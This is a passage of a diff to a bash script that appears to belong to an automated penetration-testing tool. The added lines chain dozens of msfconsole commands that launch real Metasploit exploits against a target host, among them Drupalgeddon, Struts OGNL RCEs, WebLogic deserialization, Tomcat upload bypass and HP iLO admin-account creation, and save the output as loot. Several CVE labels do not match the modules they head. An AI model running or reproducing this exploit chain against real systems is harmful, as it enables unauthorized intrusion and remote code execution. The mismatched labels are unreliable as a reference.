+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING DRUPALGEDDON HTTP PARAMETER SQL INJECTION CVE-2014-3704 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set WAIT 2; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOITS $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/htp/phpmyadmin_preg_replace; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT CVE-2017-8917 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING WORDPRESS REST API CONTENT INJECTION CVE-2017-5612 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use auxiliary/scanner/http/wordpress_content_injection; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING ORACLE WEBLOGIC WLS-WSAT DESERIALIZATION RCE CVE-2017-10271 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING APACHE STRUTS JAKARTA OGNL INJECTION CVE-2017-5638 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use multi/http/struts2_content_type_ognl; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING APACHE STRUTS 2 SHOWCASE OGNL RCE CVE-2017-9805 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING APACHE STRUTS 2 REST XSTREAM RCE CVE-2017-9791 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/tomcat_jsp_upload_bypass; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING APACHE STRUTS 2 NAMESPACE REDIRECT OGNL INJECTION CVE-2018-11776 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/struts2_namespace_ognl; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use auxiliary/scanner/http/cisco_directory_traversal; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING ORACLE WEBLOGIC SERVER DESERIALIZATION RCE CVE-2018-2628 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/misc/weblogic_deserialize; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING OSCOMMERCE INSTALLER RCE CVE-2018-2628 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/http/oscommerce_installer_unauth_code_exec; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw 2> /dev/null
     fi
+    source modes/osint_stage_2.sh
   fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED SCAN COMPLETE! $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo "$TARGET" >> $LOOT_DIR/scans/updated.txt
   rm -f $INSTALL_DIR/.fuse_* 2> /dev/null
   if [ "$LOOT" = "1" ]; then
     loot
   fi
   exit
-fi
+fi 
